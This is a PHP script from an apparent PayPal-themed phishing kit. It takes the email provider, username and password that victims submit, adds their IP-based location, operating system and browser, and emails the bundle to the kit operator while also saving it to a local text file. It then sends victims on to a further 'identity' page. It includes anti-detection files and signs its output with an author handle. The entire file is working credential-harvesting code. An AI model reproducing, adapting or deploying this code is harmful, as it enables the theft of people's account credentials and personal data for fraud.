<?php @error_reporting();session_start();require_once '../anti/anti0.php';require '../anti/anti1.php';require '../anti/anti2.php';require '../anti/anti3.php';require '../anti/anti4.php';include 'config.php';if(isset($_POST['user'])&&isset($_POST['pass'])){$provider=$_POST['provider_name'];$user=$_POST['user'];$pass=$_POST['pass'];$code=<<<EOT
########### [ New PayPal Email Access | {$dateNow} GMT] #####################
℗[Bank Name]	✪: {$provider}
℗[Username]		✪: {$user}
℗[Password]		✪: {$pass}
=-=-=-=-=-=-=-=-- ♣ ☠ |SH33NZ0| ☠ ♣-=-=-=-=-=-=-=-
✪[IP]			✪: {$_SESSION['ip']}
✪[Country]		✪: {$_SESSION['ip_countryName']}
✪[State]	    ✪: {$_SESSION['ip_state']}
✪[City]			✪: {$_SESSION['ip_city']}
✪[Zip] 			✪: {$_SESSION['ip_zip']}
✪[OS]			✪: {$_SESSION['os']}
✪[Browser]		✪: {$_SESSION['browser']}
✪[TimeZone]		✪: {$_SESSION['ip_timezone']}
########### [ ./New PayPal Email Access ] #####################
\r\n\r\n
EOT;
$subject="Thank |☠SH33NZ0☠| New PayPal Email Access [{$provider}] From [{$_SESSION['ip_countryName']}]";
$headers="From: |☠SH33NZ0☠| Email Access <SH33NZ0@GMAIL.COM>\r\n";
$headers.="MIME-Version: 1.0\r\n"
;$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($yours,$subject,$code,$headers);$save=fopen("../stored.txt","a+");fwrite($save,$code);fclose($save);if($skip_identity==true){echo "completed.php?sessionid={$_SESSION['randString']}&sslmode=true";}else{echo "identity.php?sessionid={$_SESSION['randString']}&sslmode=true";}}?>